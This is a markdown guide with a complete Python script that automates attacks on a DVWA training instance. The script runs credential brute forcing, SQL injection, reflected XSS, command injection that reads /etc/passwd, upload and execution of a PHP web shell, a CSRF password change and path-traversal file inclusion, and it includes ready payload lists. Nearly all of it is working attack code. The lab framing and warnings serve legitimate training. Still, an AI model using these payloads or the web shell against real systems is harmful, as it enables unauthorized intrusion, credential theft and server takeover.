# DVWA Attack Automation Script

This script demonstrates how to automate the execution of all major pentesting attack types against DVWA at http://10.30.0.235/dvwa for educational and authorized testing purposes only.

**WARNING:** Only use this script in a legal, controlled environment (e.g., your own DVWA lab). Unauthorized use is illegal and unethical.

---

## Prerequisites

- Python 3.x
- requests
- BeautifulSoup4
- Optional: selenium, paramiko, etc. for advanced attacks

Install dependencies:

```bash
pip3 install requests beautifulsoup4
```

---

## Script: dvwa_attack_automation.py

```python
#!/usr/bin/env python3
"""
Automate major pentesting attack types against DVWA (http://10.30.0.235/dvwa)
"""
import requests
from bs4 import BeautifulSoup
import time
import subprocess # Added for Hydra
import os # Added for checking Hydra output
import tempfile # Added for temporary credentials file
import re # Added for parsing Hydra output
import argparse # For command-line arguments

# Default settings
DVWA_URL = "http://10.30.0.235/dvwa"
LOGIN_URL = f"{DVWA_URL}/login.php"
USERNAME = "admin" # Default username for initial login and other tests
PASSWORD = "password"  # Default password for initial login and other tests

session = requests.Session()

# --- 1. Login Function ---
def login(user=USERNAME, pwd=PASSWORD): # Allow dynamic user/pass for login
    r = session.get(LOGIN_URL)
    if r.status_code == 404:
        print(f"[!] Login page not found at {LOGIN_URL} (HTTP 404). Check DVWA_URL and server status.")
        return False
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token_tag = soup.find('input', {'name': 'user_token'})
    if not user_token_tag:
        print(f"[!] Could not find user_token on login page. Page content: {r.text[:500]}")
        user_token = ""
    else:
        user_token = user_token_tag['value']

    data = {
        'username': user,
        'password': pwd,
        'Login': 'Login',
        'user_token': user_token
    }
    try:
        resp = session.post(LOGIN_URL, data=data)
        if 'Login failed' in resp.text or 'login.php' in resp.url:
             print(f"[-] Login failed for {user}")
             return False
        assert 'Logout' in resp.text, f"Login failed for user {user}!"
        print(f"[+] Logged in to DVWA as {user}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[!] RequestException during login for {user}: {e}")
        return False
    except AssertionError as e:
        print(f"[-] {e}")
        return False


# --- 2. Reconnaissance ---
def reconnaissance():
    print("[+] Performing HTTP header analysis...")
    r = session.get(DVWA_URL)
    print(r.headers)
    print("[+] Directory brute force (sample)...")
    for path in ['admin', 'phpmyadmin', 'test', 'backup', 'config', 'setup']:
        url = f"{DVWA_URL}/{path}"
        resp = session.get(url)
        print(f"{url} => {resp.status_code}")

# --- 3. Brute Force Attack ---
def brute_force():
    print("[+] Attempting brute force on login...")
    
    # Python-based brute force implementation
    # List of user:password pairs to try
    usernames = ["admin", "user", "msfadmin", "root", "postgres", "dbadmin", "tomcat"]
    passwords = ["password", "admin", "123456", "newpass", "12345", "msfadmin", "P@ssw0rd"]
    
    # Create a new session for brute force to avoid interfering with the main session
    bf_session = requests.Session()
    
    # Try all combinations
    for username in usernames:
        for password in passwords:
            print(f"[i] Trying: {username}:{password}")
            
            # Get a fresh token for each attempt
            try:
                r_token = bf_session.get(LOGIN_URL)
                soup = BeautifulSoup(r_token.text, 'html.parser')
                user_token = soup.find('input', {'name': 'user_token'})['value']
            except:
                # If we can't get a token, try the last one we had
                pass
                
            data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': user_token
            }
            
            try:
                resp = bf_session.post(LOGIN_URL, data=data, allow_redirects=True)
                
                # Check if login was successful
                if 'Logout' in resp.text and 'login.php' not in resp.url:
                    print(f"[+] SUCCESS! Valid credentials found: {username}:{password}")
                    return (username, password)
                
                # Avoid overwhelming the server
                time.sleep(0.1)
                
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during brute force attempt: {e}")
                time.sleep(1)  # Longer pause after an error
    
    print("[-] Brute force completed. No valid credentials found.")
    return None

# --- 4. SQL Injection ---
def sql_injection():
    print("[+] Performing SQL Injection...")
    # Try several payloads for better success rate
    payloads = [
        "1' OR '1'='1",
        "1 OR 1=1",
        "' OR ''='",
        "1' OR '1'='1' --"
    ]
    
    for payload in payloads:
        inj_url = f"{DVWA_URL}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
        print(f"[i] Trying payload: {payload}")
        r = session.get(inj_url)
        if 'First name' in r.text and 'Surname' in r.text:
            print(f"[!] SQL Injection successful with payload: {payload}")
            return True
    
    print("[-] SQL Injection failed or not vulnerable.")
    return False

# --- 5. XSS ---
def xss():
    print("[+] Performing XSS attack...")
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>"
    ]
    
    for payload in payloads:
        xss_url = f"{DVWA_URL}/vulnerabilities/xss_r/?name={payload}&Submit=Submit"
        print(f"[i] Trying XSS payload: {payload}")
        r = session.get(xss_url)
        if payload in r.text:
            print(f"[!] XSS payload reflected: {payload}")
            return True
    
    print("[-] XSS attack failed or not vulnerable.")
    return False

# --- 6. Command Injection ---
def command_injection():
    print("[+] Performing Command Injection...")
    payloads = [
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | cat /etc/passwd"
    ]
    
    for payload in payloads:
        ci_url = f"{DVWA_URL}/vulnerabilities/exec/"
        data = {'ip': payload, 'Submit': 'Submit'}
        print(f"[i] Trying command: {payload}")
        r = session.post(ci_url, data=data)
        if 'root:x:' in r.text:
            print(f"[!] Command Injection successful with: {payload}")
            return True
    
    print("[-] Command Injection failed or not vulnerable.")
    return False

# --- 7. File Upload ---
def file_upload():
    print("[+] Attempting file upload...")
    upload_url = f"{DVWA_URL}/vulnerabilities/upload/"
    
    # Test different file types
    test_files = [
        ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
        ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
        ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
    ]
    
    for filename, content, content_type in test_files:
        files = {'uploaded': (filename, content, content_type)}
        data = {'Upload': 'Upload'}
        
        print(f"[i] Trying to upload: {filename}")
        r = session.post(upload_url, files=files, data=data)
        
        if 'succesfully uploaded' in r.text.lower() or filename in r.text:
            print(f"[!] File upload successful with: {filename}")
            
            # Try to execute the uploaded shell
            shell_url = f"{DVWA_URL}/hackable/uploads/{filename}?cmd=id"
            r2 = session.get(shell_url)
            if r2.status_code == 200 and len(r2.text.strip()) > 0:
                print(f"[+] Shell execution successful! Output:")
                print(r2.text)
            return True
    
    print("[-] File upload failed or not vulnerable.")
    return False

# --- 8. CSRF ---
def csrf():
    print("[+] Attempting CSRF attack (change password)...")
    profile_url = f"{DVWA_URL}/vulnerabilities/csrf/"
    
    # Create data for changing password
    data = {
        'password_new': 'newpass',
        'password_conf': 'newpass',
        'Change': 'Change'
    }
    
    # Submit via GET (CSRF scenario)
    query_params = "&".join([f"{key}={value}" for key, value in data.items()])
    csrf_url = f"{profile_url}?{query_params}"
    
    print(f"[i] Sending CSRF request to: {csrf_url}")
    resp = session.get(csrf_url)
    
    if 'Password Changed' in resp.text:
        print("[!] CSRF successful!")
        return True
    else:
        print("[-] CSRF attack failed or not vulnerable.")
        return False

# --- 9. LFI/RFI ---
def lfi():
    print("[+] Attempting LFI...")
    payloads = [
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd"
    ]
    
    for payload in payloads:
        lfi_url = f"{DVWA_URL}/vulnerabilities/fi/?page={payload}"
        print(f"[i] Trying LFI payload: {payload}")
        r = session.get(lfi_url)
        if 'root:x:' in r.text:
            print(f"[!] LFI successful with: {payload}")
            return True
    
    print("[-] LFI failed or not vulnerable.")
    return False

# --- 10. Logout ---
def logout():
    # Ensure we are logged in before trying to logout, to avoid errors if brute_force failed
    # and subsequent attacks were skipped or if login itself failed.
    try:
        r_check = session.get(DVWA_URL + "/index.php")
        if "Logout" in r_check.text:
            session.get(f"{DVWA_URL}/logout.php")
            print("[+] Logged out.")
        else:
            print("[i] Not logged in or session expired, skipping logout.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during logout check: {e}")


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="DVWA Attack Automation Script")
    parser.add_argument("--url", default=DVWA_URL, help="URL of DVWA instance")
    parser.add_argument("--username", default=USERNAME, help="Username for login")
    parser.add_argument("--password", default=PASSWORD, help="Password for login")
    args = parser.parse_args()
    
    # Update global variables if args provided
    if args.url != DVWA_URL:
        DVWA_URL = args.url
        LOGIN_URL = f"{DVWA_URL}/login.php"
    if args.username != USERNAME:
        USERNAME = args.username
    if args.password != PASSWORD:
        PASSWORD = args.password
    
    print(f"[i] Target: {DVWA_URL}")
    
    initial_login_success = login() # Initial login to set up session cookies for other attacks

    if not initial_login_success:
        print("[!] Initial login failed. Some attacks might not work. Exiting.")
        exit(1)

    reconnaissance()

    found_credentials = brute_force()
    if found_credentials:
        print(f"[+] Found valid credentials: {found_credentials[0]}:{found_credentials[1]}")
    
    # Re-login with the original credentials to ensure session validity for subsequent attacks
    print("[i] Re-logging in with original credentials to ensure session state for subsequent attacks...")
    login(USERNAME, PASSWORD) # Explicitly use original USERNAME, PASSWORD

    sql_injection()
    xss()
    command_injection()
    file_upload()
    csrf()
    lfi()
    logout()
    print("[+] All attacks attempted. Review DVWA for results.")
```

---

**Note:**

- This script covers: reconnaissance, brute force (now using Python for better reliability), SQLi, XSS, command injection, file upload, CSRF, LFI, and logout.
- Multiple attack payloads are tried for each vulnerability type to increase success rates.
- Command-line arguments are now supported to customize target URL and credentials.
- For privilege escalation, persistence, exfiltration, and DoS, use manual or advanced tools (Metasploit, custom scripts, etc.).
- Always reset DVWA to a safe state after testing.
- This script is intended for educational purposes and authorized security testing only.
